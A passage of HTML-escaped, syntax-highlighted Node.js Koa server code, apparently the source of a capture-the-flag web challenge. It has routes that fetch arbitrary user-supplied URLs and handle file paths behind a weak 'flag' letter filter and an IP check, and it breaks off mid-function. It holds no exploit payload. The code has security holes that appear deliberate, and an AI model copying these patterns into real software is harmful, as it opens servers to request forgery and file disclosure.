&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;删除文件成功&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">home&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/query&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#00a8c8">async&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">)=&amp;gt;{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">query&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">param&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">response&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">query&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">param&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">/&amp;amp;/g&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;amp;amp;&amp;#39;&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">/&amp;lt;/g&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;amp;lt;&amp;#39;&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">/&amp;gt;/g&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;amp;gt;&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">status&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">403&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">response&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;missing parameter:param&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">home&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/request&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#00a8c8">async&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">)=&amp;gt;{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">username&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#d88200">&amp;#39;ADMIN&amp;#39;&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">query&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">decodeURI&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">checkUrl&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">query&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#d88200">&amp;#39;errorurl&amp;#39;&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">response&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;error url&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;请求的url:&amp;#34;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#00a8c8">typeof&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#d88200">&amp;#34;:&amp;#34;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Promise&lt;/span>&lt;span style="color:#111">(&lt;/span> &lt;span style="color:#75af00">resolve&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">req&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">request&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">res&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">setEncoding&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;utf-8&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">error&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">statusCode&lt;/span> &lt;span style="color:#f92672">!==&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">error&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Error&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;请求失败\n&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">`状态码: &lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">statusCode&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">`&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">error&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">error&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">error&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">message&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">resume&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">on&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;data&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">chunk&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">data&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#75af00">chunk&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">on&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;end&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">async&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">out&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">WriteResults&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">sandbox&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;Requst results in :&amp;#39;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;tmp&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">resolve&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">on&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;error&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">end&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">status&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">403&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">response&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;403: You have not the permission&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">home&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/save&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#00a8c8">async&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">)=&amp;gt;{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">ip&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">request&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">ip&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ip&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">substr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">7&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#34;::ffff:&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">ip&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">ip&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">substr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">7&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ip&lt;/span> &lt;span style="color:#f92672">!==&lt;/span> &lt;span style="color:#d88200">&amp;#39;127.0.0.1&amp;#39;&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#75af00">ip&lt;/span> &lt;span style="color:#f92672">!==&lt;/span> &lt;span style="color:#75af00">server_ip&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">status&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">403&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">response&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;403: You are not the local user&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">reqbody&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span>&lt;span style="color:#00a8c8">switch&lt;/span>&lt;span style="color:#f92672">:&lt;/span>&lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">reqbody&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">qs&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">parse&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">querystring&lt;/span>&lt;span style="color:#111">,{&lt;/span>&lt;span style="color:#75af00">allowPrototypes&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">reqbody&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#00a8c8">switch&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#75af00">reqbody&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">sandbox&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#75af00">reqbody&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">opath&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span>&lt;span style="color:#75af00">fs&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">existsSync&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">reqbody&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">spath&lt;/span>&lt;span style="color:#111">)){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">fs&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">existsSync&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">reqbody&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">sandbox&lt;/span>&lt;span style="color:#111">)){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">paths&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">opath&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">fs&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">readdirSync&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">reqbody&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">sandbox&lt;/span>&lt;span style="color:#111">)[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">fs&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">existsSync&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">reqbody&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">opath&lt;/span>&lt;span style="color:#111">)){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">buffer&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">tmp&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">reqbody&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">sandbox&lt;/span>&lt;span style="color:#111">][&lt;/span>&lt;span style="color:#d88200">&amp;#39;opath&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">reqbody&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">opath&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">/[flag]/&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">test&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">tmp&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">reqbody&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">sandbox&lt;/span>&lt;span style="color:#111">][&lt;/span>&lt;span style="color:#d88200">&amp;#39;opath&amp;#39;&lt;/span>&lt;span style="color:#111">])){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">buffer&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">tmp&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">reqbody&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">sandbox&lt;/span>&lt;span style="color:#111">][&lt;/span>&lt;span style="color:#d88200">&amp;#39;opath&amp;#39;&lt;/span>&lt;span style="color:#111">].&lt;/span>&lt;span style="color:#75af00">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">/f|l|a|g/g&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
